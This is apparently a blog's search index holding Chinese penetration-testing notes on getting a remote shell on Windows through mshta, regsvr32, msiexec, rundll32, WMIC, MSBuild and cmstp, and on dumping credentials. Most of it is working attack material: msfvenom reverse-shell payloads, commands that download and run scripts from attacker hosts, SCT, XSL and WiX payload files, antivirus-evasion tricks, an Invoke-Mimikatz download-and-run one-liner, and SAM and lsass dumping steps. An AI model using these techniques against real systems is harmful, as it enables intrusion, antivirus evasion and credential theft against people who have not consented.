<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>在命令执行的情况下上线的几种方式-Windows</title>
    <url>/2021/01/13/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        对Windows的系统，经常会出现可以执行命令，但无法上线或是拿shell的情况<a id="more"></a>。针对Windows的上线分为远程执行和本地运行，以下就两种利用方式把从各类技巧做一个汇总。</p>
<hr>
<h2 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h2><h3 id="mshta方式"><a href="#mshta方式" class="headerlink" title="mshta方式"></a>mshta方式</h3><h4 id="metaspolit模块"><a href="#metaspolit模块" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">mshta xxx</span><br><span class="line">执行mshta xxxxx</span><br></pre></td></tr></table></figure>
<h4 id="配合CACTUSTORCH"><a href="#配合CACTUSTORCH" class="headerlink" title="配合CACTUSTORCH"></a>配合CACTUSTORCH</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载 https:&#x2F;&#x2F;github.com&#x2F;mdsecactivebreach&#x2F;CACTUSTORCH</span><br><span class="line">生成raw格式的shellcode并base64</span><br><span class="line">	base64从文件快速编码命令：cat 1.bin |base64 -w 0</span><br><span class="line">修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode</span><br><span class="line">执行mshta http:&#x2F;&#x2F;x.x.x.x&#x2F;CACTUSTORCH.hta</span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT"><a href="#配合GreatSCT" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use mshta&#x2F;shellcode_inject&#x2F;base64_migrate</span><br></pre></td></tr></table></figure>
<h3 id="msiexec方式"><a href="#msiexec方式" class="headerlink" title="msiexec方式"></a>msiexec方式</h3><p>可以将msi后缀改为png</p>
<h4 id="metaspolit模块-1"><a href="#metaspolit模块-1" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 –f msi &gt; shell.msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;x.x.x.x&#x2F;shell.msi</span><br></pre></td></tr></table></figure>
<h4 id="自编译msi"><a href="#自编译msi" class="headerlink" title="自编译msi"></a>自编译msi</h4><p>修改恶意msi.wix文件中要执行的命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="tag"><span class="string">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>calc</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用wix工具编译生成msi.wix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">candle.exe msi.wix</span><br><span class="line">light.exe xxx.wixobj</span><br></pre></td></tr></table></figure>
<h4 id="exe转msi"><a href="#exe转msi" class="headerlink" title="exe转msi"></a>exe转msi</h4><p>使用exe2msi.msi工具将exe转为msi</p>
<p>如果exe是免杀的，那么这样一来就可以无需exe落地就能远程执行</p>
<h3 id="regsvr32方式"><a href="#regsvr32方式" class="headerlink" title="regsvr32方式"></a>regsvr32方式</h3><h4 id="配合metaspolit模块"><a href="#配合metaspolit模块" class="headerlink" title="配合metaspolit模块"></a>配合metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;file.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="配合empire"><a href="#配合empire" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uselistner http			#开启监听</span><br><span class="line">set Host http:&#x2F;&#x2F;192.168.1.109 #设置监听地址</span><br><span class="line">execute		#运行监听</span><br><span class="line">usestager windows&#x2F;launcher_sct  #选择模块</span><br><span class="line">set listener http	#选择监听</span><br><span class="line">execute		#运行模块</span><br><span class="line">regsvr &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.109:8080&#x2F;tmp&#x2F;launcher.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<h4 id="自定义SCT文件"><a href="#自定义SCT文件" class="headerlink" title="自定义SCT文件"></a>自定义SCT文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;PoC&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--  License: BSD3-Clause --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;calc.exe&quot;</span>);	</span></span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行：regsvr32 /u /n /s /i:<a href="http://192.168.1.109/1.sct">http://192.168.1.109/1.sct</a> scrobj.dll</p>
<h4 id="配合koadic"><a href="#配合koadic" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;regsvr</span><br><span class="line">set srvhost 192.168.1.107</span><br><span class="line">run</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http;&#x2F;&#x2F;192.168.1.107:9998&#x2F;uWBjv scrobj.dll</span><br><span class="line">zombies 0</span><br></pre></td></tr></table></figure>
<h4 id="配合JSRat"><a href="#配合JSRat" class="headerlink" title="配合JSRat"></a>配合JSRat</h4><p>下载<a href="https://github.com/Hood3dRob1n/JSRat-Py">https://github.com/Hood3dRob1n/JSRat-Py</a></p>
<p>在本机执行./JSRat.py -I 0.0.0.0 -p 9999后，脚本会自动生成命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSRat Server - Python Implementation</span><br><span class="line">By: Hood3dRob1n</span><br><span class="line"></span><br><span class="line">[*] Web Server Started on Port: 9999</span><br><span class="line">[*] Awaiting Client Connection to:</span><br><span class="line">   [*] rundll32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;connect</span><br><span class="line">   [*] regsvr32 invocation: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;file.sct</span><br><span class="line">      [*] Client Command at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;wtf</span><br><span class="line">      [*] Browser Hook Set at: http:&#x2F;&#x2F;0.0.0.0:9999&#x2F;hook</span><br><span class="line"></span><br><span class="line">[-] Hit CTRL+C to Stop the Server at any time...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="配合GreatSCT-1"><a href="#配合GreatSCT-1" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use regsvr&#x2F;shellcode_iject&#x2F;base64_migrate.py</span><br><span class="line">generate</span><br></pre></td></tr></table></figure>
<h4 id="Bypass的一些方式"><a href="#Bypass的一些方式" class="headerlink" title="Bypass的一些方式"></a>Bypass的一些方式</h4><h5 id="使用命令绕过"><a href="#使用命令绕过" class="headerlink" title="使用命令绕过"></a>使用命令绕过</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符干扰</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:h^t^t^p:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:h&quot;t&quot;t&quot;p:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">目录移动</span><br><span class="line">copy c:\windows\system32\regsvr32.exe  C:\Users\Administrator\Desktop\regs.exe</span><br><span class="line">regs.exe &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct scrobj.dll</span><br><span class="line">copy c:\windows\system32\scrobj.dll newscrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct newscrobj.dll</span><br><span class="line"></span><br><span class="line">符号链接，需要链接的dll目录下进行</span><br><span class="line">Mklink.exe c:\programdata\Myscrobj.dll c:\windows\system32\scrobj.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct Myscrobj.dll</span><br><span class="line"></span><br><span class="line">数据流（ADS）</span><br><span class="line">type c:\windows\system32\scrobj.dll &gt; test.txt:new1.dll</span><br><span class="line">regsvr32 &#x2F;u &#x2F;n &#x2F;s &#x2F;i:http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct test.txt:new1.dll</span><br><span class="line"></span><br><span class="line">本地运行</span><br><span class="line">bitsadmin &#x2F;transfer download &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;192.168.122.1&#x2F;2021.sct %TEMP%\new2021.txt &amp;&amp; regsvr32.exe &#x2F;s &#x2F;u &#x2F;i:%TEMP%\new2021.txt scrobj.dll</span><br></pre></td></tr></table></figure>
<h5 id="远程调用本地加载"><a href="#远程调用本地加载" class="headerlink" title="远程调用本地加载"></a>远程调用本地加载</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    TCHAR *dllpath &#x3D; _T(&quot;c:\\windows\\system32\\scrobj.dll&quot;);</span><br><span class="line">    HMODULE hDllScr &#x3D; LoadLibrary(dllpath);</span><br><span class="line">    if (hDllScr &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;Load scrobj.dll fail!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Load scrobj.dll success!&quot;);</span><br><span class="line">    printf(&quot;Address: %p\n&quot;, hDllScr);</span><br><span class="line">    void* DllInstallProcAddr &#x3D; (void*)GetProcAddress(hDllScr, &quot;DllInstall&quot;);</span><br><span class="line">    if (DllInstallProcAddr &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;Can not found DllInstall in scrobj.dll!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Found Dllinstall(%p) in scrobj.dll!&quot;, DllInstallProcAddr);</span><br><span class="line">    ((void (*)(BOOL, TCHAR*))DllInstallProcAddr)(FALSE, L&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;ttt.txt&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>远程调用的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;TESTING&quot;&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">  progid&#x3D;&quot;TESTING&quot;</span><br><span class="line">  classid&#x3D;&quot;&#123;A1112221-0000-0000-3000-000DA00DABFC&#125;&quot; &gt;</span><br><span class="line"></span><br><span class="line">  &lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">      var wsc &#x3D; &quot;WScript.Shell&quot;;</span><br><span class="line">      var com &#x3D; &quot;calc.exe&quot;;</span><br><span class="line">      var foo &#x3D; new ActiveXObject(wsc).Run(com);</span><br><span class="line">    ]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line">&lt;&#x2F;component&gt;</span><br></pre></td></tr></table></figure>
<h3 id="rundll32方式"><a href="#rundll32方式" class="headerlink" title="rundll32方式"></a>rundll32方式</h3><h4 id="metaspolit模块-2"><a href="#metaspolit模块-2" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 -f dll &gt; 1.dll</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</span><br></pre></td></tr></table></figure>
<h4 id="配合Koadic"><a href="#配合Koadic" class="headerlink" title="配合Koadic"></a>配合Koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;rundll32_js</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h3 id="SCT文件直接利用"><a href="#SCT文件直接利用" class="headerlink" title="SCT文件直接利用"></a>SCT文件直接利用</h3><h4 id="pubprn-vbs结合SCT文件利用"><a href="#pubprn-vbs结合SCT文件利用" class="headerlink" title="pubprn.vbs结合SCT文件利用"></a>pubprn.vbs结合SCT文件利用</h4><p>windows7下未成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;10.100.18.20:8000&#x2F;1.sct</span><br></pre></td></tr></table></figure>
<h4 id="配合empire-1"><a href="#配合empire-1" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">set Host 192.168.1.109</span><br><span class="line">execute</span><br><span class="line">usestager windows&#x2F;launcher_sct</span><br><span class="line">set Listener HTTP</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
<h3 id="WMIC利用xsl方式"><a href="#WMIC利用xsl方式" class="headerlink" title="WMIC利用xsl方式"></a>WMIC利用xsl方式</h3><h4 id="配合koadic-1"><a href="#配合koadic-1" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;koadic</span><br><span class="line">use stager&#x2F;js&#x2F;wmic</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br><span class="line">wmic os get &#x2F;FORMAT:&quot;http:&#x2F;&#x2F;192.168.1.109&#x2F;payload.xsl&quot;</span><br></pre></td></tr></table></figure>
<h4 id="自定义xsl"><a href="#自定义xsl" class="headerlink" title="自定义xsl"></a>自定义xsl</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
<h2 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h2><p>一般而言，本地执行的BypassAV的能力都比远程强，缺点就是文件落地难。</p>
<h3 id="MSbuild-exe利用"><a href="#MSbuild-exe利用" class="headerlink" title="MSbuild.exe利用"></a>MSbuild.exe利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.76.107.177 lport&#x3D;6677 -f csharp</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  exp.csproj  （改为XML格式也可）</span><br></pre></td></tr></table></figure>
<h3 id="INF文件利用"><a href="#INF文件利用" class="headerlink" title="INF文件利用"></a>INF文件利用</h3><h4 id="配合cmstp-exe"><a href="#配合cmstp-exe" class="headerlink" title="配合cmstp.exe"></a>配合cmstp.exe</h4><p>依靠加载远程sct文件利用</p>
<p>新建一个inf，在代码处填入恶意sct文件。</p>
<p>然后运行cmstp.exe /s shell.inf</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall_SingleUser]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line"><span class="section">[UnRegisterOCXSection]</span></span><br><span class="line">%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;Yay&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;Yay&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="配合InfDefaultInstall-exe"><a href="#配合InfDefaultInstall-exe" class="headerlink" title="配合InfDefaultInstall.exe"></a>配合InfDefaultInstall.exe</h4><p>运行InfDefaultInstall.exe shady.inf</p>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>上线</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows中抓密码</title>
    <url>/2021/01/14/Windows%E6%8A%93%E5%AF%86%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><em>记录一下几种抓密码的不同方式</em><a id="more"></a></p>
<h2 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h2><h3 id="远程直接抓"><a href="#远程直接抓" class="headerlink" title="远程直接抓"></a>远程直接抓</h3><h4 id="MeterPreter"><a href="#MeterPreter" class="headerlink" title="MeterPreter"></a>MeterPreter</h4><p>直接敲命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">meterpreter &gt; msv  获取的是hash值</span><br><span class="line">meterpreter &gt; ssp  获取的是明文信息</span><br><span class="line">meterpreter &gt; wdigest  读取内存中存放的账号密码明文信息</span><br></pre></td></tr></table></figure>
<h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p>直接右键</p>
<h4 id="PowerSpolit"><a href="#PowerSpolit" class="headerlink" title="PowerSpolit"></a>PowerSpolit</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
<h4 id="MimiKatz"><a href="#MimiKatz" class="headerlink" title="MimiKatz"></a>MimiKatz</h4><p>前提是上传了</p>
<p>2012R2需要修改注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加载明文：</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line"></span><br><span class="line">不加载明文：</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h3 id="本地抓"><a href="#本地抓" class="headerlink" title="本地抓"></a>本地抓</h3><h4 id="导出SAM文件"><a href="#导出SAM文件" class="headerlink" title="导出SAM文件"></a>导出SAM文件</h4><p>导出SAM和System⽂件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
<p>读取⽂件<br>mimikatz读取SAM和SYSTEM⽂件[将导⼊的hive⽂件放到本地]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive</span><br></pre></td></tr></table></figure>
<h4 id="通过Procdump"><a href="#通过Procdump" class="headerlink" title="通过Procdump"></a>通过Procdump</h4><p>通过Procdump dump lsass.exe 进程数据并将其保存到 lsass.dmp 文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
<p>将lsass.tmp拉取到本地使用mimikatz解密目标系统密码。（本地机器需与目标机器的版本位数一致。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>hashdump</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows中找敏感信息</title>
    <url>/2021/01/14/%E5%9C%A8Windows%E4%B8%AD%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p><em>信息搜集很重要</em><a id="more"></a></p>
